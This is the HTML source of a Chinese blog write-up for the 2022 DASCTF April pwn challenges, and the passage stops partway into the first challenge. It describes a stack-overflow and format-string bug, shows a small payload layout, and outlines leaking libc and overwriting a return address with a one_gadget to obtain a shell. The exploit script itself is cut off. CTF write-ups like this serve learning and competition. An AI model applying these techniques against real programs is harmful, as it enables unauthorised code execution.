@@ -1,0 +1,1841 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>2022DASCTF-Apr-X-FATE-Pwn-Wp | roderick - record and learn!</title><meta name="author" content="roderick">
+<meta name="description" content="2022DASCTF-Apr-X-FATE-Pwn-Wp时间太仓促了，题目逆向的工作量有点大，远程还有不少毛病&hellip;&hellip;一言难尽。下来把剩下几道题都复现一遍，wp持续更新中已写完收工。
+"><meta name="keywords" content='pwn'>
+  <meta itemprop="name" content="2022DASCTF-Apr-X-FATE-pwn-wp">
+  <meta itemprop="description" content="2022DASCTF-Apr-X-FATE-Pwn-Wp时间太仓促了，题目逆向的工作量有点大，远程还有不少毛病……一言难尽。下来把剩下几道题都复现一遍，wp持续更新中已写完收工。">
+  <meta itemprop="datePublished" content="2022-04-23T18:21:41+08:00">
+  <meta itemprop="dateModified" content="2022-04-23T18:21:41+08:00">
+  <meta itemprop="wordCount" content="6180">
+  <meta itemprop="image" content="https://roderickchan.github.io/">
+  <meta itemprop="keywords" content="pwn"><meta property="og:url" content="https://roderickchan.github.io/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/">
+  <meta property="og:site_name" content="roderick - record and learn!">
+  <meta property="og:title" content="2022DASCTF-Apr-X-FATE-pwn-wp">
+  <meta property="og:description" content="2022DASCTF-Apr-X-FATE-Pwn-Wp时间太仓促了，题目逆向的工作量有点大，远程还有不少毛病……一言难尽。下来把剩下几道题都复现一遍，wp持续更新中已写完收工。">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-04-23T18:21:41+08:00">
+    <meta property="article:modified_time" content="2022-04-23T18:21:41+08:00">
+    <meta property="article:tag" content="pwn">
+    <meta property="og:image" content="https://roderickchan.github.io/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://roderickchan.github.io/">
+  <meta name="twitter:title" content="2022DASCTF-Apr-X-FATE-pwn-wp">
+  <meta name="twitter:description" content="2022DASCTF-Apr-X-FATE-Pwn-Wp时间太仓促了，题目逆向的工作量有点大，远程还有不少毛病……一言难尽。下来把剩下几道题都复现一遍，wp持续更新中已写完收工。">
+<meta name="application-name" content="roderick - record and learn!">
+<meta name="apple-mobile-web-app-title" content="roderick - record and learn!"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#2d89ef"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#FF7359"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" type="text/html" href="https://roderickchan.github.io/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/" title="2022DASCTF-Apr-X-FATE-pwn-wp | roderick - record and learn!" /><link rel="prev" type="text/html" href="https://roderickchan.github.io/zh-cn/2022-04-15-buuctf-pwn-tasks-20/" title="BUUCTF-pwn合集" /><link rel="next" type="text/html" href="https://roderickchan.github.io/zh-cn/2022-04-28-seccon-2020-kstack/" title="seccon-2020-kstack" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "2022DASCTF-Apr-X-FATE-pwn-wp",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/roderickchan.github.io\/zh-cn\/2022-04-23-2022dasctf-apr-x-fate-pwn-wp\/"
+    },"image": ["https:\/\/roderickchan.github.io\/images\/apple-devices-preview.webp"],"genre": "posts","keywords": "pwn","wordcount":  6180 ,
+    "url": "https:\/\/roderickchan.github.io\/zh-cn\/2022-04-23-2022dasctf-apr-x-fate-pwn-wp\/","datePublished": "2022-04-23T18:21:41+08:00","dateModified": "2022-04-23T18:21:41+08:00","license": "本站内容采用 CC BY-NC-SA 4.0 国际许可协议。","publisher": {
+      "@type": "Organization",
+      "name": "roderick","logo": "https:\/\/roderickchan.github.io\/images\/avatar.png"},"author": {
+        "@type": "Person",
+        "name": "roderick"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper" data-github-corner="right">
+    <div class="header-title">
+      <a href="/zh-cn/" title="roderick - record and learn!"><img class="logo" src='/logo.png' alt="roderick - record and learn!" height="32" width="32"><span class="header-title-text">roderick&#39;s blog</span></a><span class="typeit header-subtitle"><template>To record and learn!</template></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 全部文章</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/collections/"><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden="true"></i> 合集</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item">
+              <a class="menu-link" href="/zh-cn/comment/"><i class="fa-regular fa-comments fa-fw fa-sm" aria-hidden="true"></i> 留言板</a></li><li class="menu-item">
+              <a class="menu-link" href="https://roderick:rode%40rick@download.roderickchan.cn/" title="我的资源下载中心" rel="noopener noreferrer" target="_blank"><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li><li class="menu-item language-switch">
+            <span role="button" aria-label="选择语言" title="选择语言"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
+            <ul class="sub-menu"><li class="menu-item">没有更多翻译</li></ul>
+          </li><li class="menu-item language-switch auto d-none" aria-hidden="true">
+    <span role="button" aria-label="选择语言" title="选择语言"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
+    <ul class="sub-menu"><li class="menu-item active" data-type="artificial">
+              <a href="/zh-cn/2022-04-23-2022dasctf-apr-x-fate-pwn-wp/" data-lang="zh-CN" class="menu-link text-secondary" title="简体中文">
+                <i class="fa-solid fa-person fa-fw fa-sm" aria-hidden="true"></i> 简体中文</a>
+            </li><li class="menu-item-divider" aria-hidden="true"></li><li class="menu-item" data-type="machine">
+          <a data-lang="english" class="menu-link" title="English">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> English</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="french" class="menu-link" title="Français">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> Français</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="russian" class="menu-link" title="Русский язык">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> Русский язык</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="chinese_simplified" class="menu-link" title="简体中文">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 简体中文</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="hindi" class="menu-link" title="हिन्दी">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> हिन्दी</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="japanese" class="menu-link" title="日本語">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 日本語</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="chinese_traditional" class="menu-link" title="繁體中文">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 繁體中文</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="spanish" class="menu-link" title="Español">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> Español</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="korean" class="menu-link" title="한국어">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 한국어</a>
+        </li></ul>
+  </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/zh-cn/" title="roderick - record and learn!"><img class="logo" src='/logo.png' alt="roderick - record and learn!" height="26" width="26"><span class="header-title-text">roderick&#39;s blog</span></a><span class="typeit header-subtitle"><template>To record and learn!</template></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/zh-cn/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 全部文章</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/collections/"><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden="true"></i> 合集</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item"><a class="menu-link" href="/zh-cn/comment/"><i class="fa-regular fa-comments fa-fw fa-sm" aria-hidden="true"></i> 留言板</a></li><li class="menu-item"><a class="menu-link" href="https://roderick:rode%40rick@download.roderickchan.cn/" title="我的资源下载中心" rel="noopener noreferrer" target="_blank"><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> 下载</a></li><li class="menu-item text-center"><a class="menu-link" href="https://github.com/RoderickChan" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
+              <span role="button" aria-label="选择语言" title="选择语言">简体中文<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
+              <select class="language-select" onchange="location = this.value;"><option disabled>没有更多翻译</option></select>
+            </span><span id="translate" class="menu-system-item language-switch auto d-none" aria-hidden="true">
+    <span role="button" aria-label="选择语言" title="选择语言" data-current="简体中文">简体中文<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
+  </span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/zh-cn/posts/" title="Posts">文章</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">2022DASCTF-Apr-X-FATE-Pwn-Wp</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"><div class="details related-details open">
+      <div class="details-summary related-summary">
+        <i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden="true"></i>
+        <span class="related-title">相关内容</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div>
+      <div class="details-content related-content">
+        <ul class="related-list"><li class="related-item">
+              <a href="/zh-cn/2022-03-08-buuctf-pwn-tasks-20/" title="Buuctf-Pwn-Tasks-20">Buuctf-Pwn-Tasks-20</a></li><li class="related-item">
+              <a href="/zh-cn/2022-02-12-vnctf2022-pwn-wp/" title="V&amp;NCTF2022-Pwn-Wp">V&amp;NCTF2022-Pwn-Wp</a></li><li class="related-item">
+              <a href="/zh-cn/2021-09-12-ciscn-2019-pwn%E7%B3%BB%E5%88%97/" title="Ciscn-2019-Pwn系列">Ciscn-2019-Pwn系列</a></li><li class="related-item">
+              <a href="/zh-cn/2022-03-28-2022dasctfxsu%E4%B8%89%E6%9C%88%E6%98%A5%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-pwn-wp/" title="2022DASCTFXSU三月春季挑战赛-Pwn-Wp">2022DASCTFXSU三月春季挑战赛-Pwn-Wp</a></li><li class="related-item">
+              <a href="/zh-cn/2022-04-15-buuctf-pwn-tasks-20/" title="BUUCTF-Pwn合集">BUUCTF-Pwn合集</a></li></ul>
+      </div>
+    </div><div class="aside-custom"><img src="https://image.roderickchan.cn/img/roderick_wechat_official_account_white_in_green.png" height="104" width="372">
+
+</div></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>2022DASCTF-Apr-X-FATE-Pwn-Wp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://roderickchan.github.io" title="作者"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&d=mp' alt="roderick" height="16" width="16">&nbsp;roderick</a></span><span class="post-included-in">&nbsp;收录于 <a href="/zh-cn/categories/pwn-wp/" class="post-category" title="分类 - pwn-wp"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> pwn-wp</a></span></div><div class="post-meta-line"><span title="发布于 2022-04-23 18:21:41"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-04-23">2022-04-23</time></span>&nbsp;<span title="6180 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 6200 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 13 分钟</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="2022DASCTF-Apr-X-FATE-Pwn-Wp"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;次阅读
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#2022dasctf-apr-x-fate-pwn-wp">2022DASCTF-Apr-X-FATE-pwn-wp</a>
+      <ul>
+        <li><a href="#1-good_luck">1 good_luck</a>
+          <ul>
+            <li><a href="#checksec">checksec</a></li>
+            <li><a href="#漏洞点">漏洞点</a></li>
+            <li><a href="#利用思路">利用思路</a></li>
+            <li><a href="#exp">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#2-ssstring">2 ssstring</a>
+          <ul>
+            <li><a href="#checksec-1">checksec</a></li>
+            <li><a href="#漏洞点-1">漏洞点</a></li>
+            <li><a href="#利用思路-1">利用思路</a></li>
+            <li><a href="#exp-1">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#3-easysystem">3 easysystem</a>
+          <ul>
+            <li><a href="#checksec-2">checksec</a></li>
+            <li><a href="#漏洞点-2">漏洞点</a></li>
+            <li><a href="#利用思路-2">利用思路</a></li>
+            <li><a href="#exp-2">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#4-try2findme">4 try2findme</a>
+          <ul>
+            <li><a href="#checksec-3">checksec</a></li>
+            <li><a href="#题目分析">题目分析</a></li>
+            <li><a href="#利用思路-3">利用思路</a></li>
+            <li><a href="#exp-3">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#5-storage">5 storage</a>
+          <ul>
+            <li><a href="#checksec-4">checksec</a></li>
+            <li><a href="#漏洞点-3">漏洞点</a></li>
+            <li><a href="#利用思路-4">利用思路</a></li>
+            <li><a href="#exp-4">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#引用与参考">引用与参考</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><div class="expiration-reminder details admonition note open">
+      <div class="details-summary admonition-title">
+        <i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i>注意<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i>
+      </div>
+      <div class="details-content">
+        <div class="admonition-content">本文最后更新于 2022-04-23，文中内容可能已过时。</div>
+      </div>
+    </div><h2 class="heading-element" id="2022dasctf-apr-x-fate-pwn-wp"><span>2022DASCTF-Apr-X-FATE-Pwn-Wp</span>
+  <a href="#2022dasctf-apr-x-fate-pwn-wp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>时间太仓促了，题目逆向的工作量有点大，远程还有不少毛病&hellip;&hellip;一言难尽。下来把剩下几道题都复现一遍，<del><code>wp</code>持续更新中</del>已写完收工。</p>
+<blockquote>
+<p>小广告：解题脚本均使用我自己开发的工具<a href="https://github.com/RoderickChan/pwncli"target="_blank" rel="external nofollow noopener noreferrer">pwncli<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a>编写，欢迎感兴趣的<code>pwner</code>师傅们试用~</p></blockquote>
+<!-- more -->
+<h2 class="heading-element" id="1-good_luck"><span>1 Good_luck</span>
+  <a href="#1-good_luck" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>眼疾手快拿了个一血，这题其实很简单，但是远程的问题很大。附件都更新了两次，就很迷~</p>
+<h3 class="heading-element" id="checksec"><span>Checksec</span>
+  <a href="#checksec" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220423183142291.png' alt="image-20220423183142291"></p>
+<p>没有给<code>libc</code>。</p>
+<h3 class="heading-element" id="漏洞点"><span>漏洞点</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e7%82%b9" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>要么栈溢出+格式化字符串，要么栈溢出：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220423183249430.png' alt="image-20220423183249430"></p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220423183307699.png' alt="image-20220423183307699"></p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220423183323408.png' alt="image-20220423183323408"></p>
+<h3 class="heading-element" id="利用思路"><span>利用思路</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>由于这两种的概率是<code>1/2</code>，所以可以根据不同的输出来使用不同的<code>payload</code>。当然，可以编写一个通用的<code>payload</code>同时适用这两种情况。</p>
+<p>观察到<code>fmt</code>函数的缓冲区距离<code>rbp</code>是<code>0x70</code>，<code>overflow</code>函数的缓冲区距离<code>rbp</code>是<code>0x50</code>，所以前面的通用的<code>payload</code>可以为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">layoud</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="mh">0x58</span><span class="p">:</span> <span class="p">[</span><span class="n">ret_addr</span><span class="p">]</span> <span class="o">*</span> <span class="mi">4</span> 
+</span></span><span class="line"><span class="cl">    <span class="mh">0x78</span><span class="p">:</span> <span class="s2">&#34;deadbeef&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>因此，思路为：</p>
+<ul>
+<li>使用通用<code>payload</code>再次执行<code>fmt</code></li>
+<li>第一次<code>fmt</code>，利用格式化字符串泄露出<code>libc</code>地址，并再次执行<code>fmt</code></li>
+<li>根据泄露出来的地址，计算并填入<code>one_gadget</code>即可获得<code>shell</code></li>
+</ul>
+<h3 class="heading-element" id="exp"><span>EXP</span>
+  <a href="#exp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
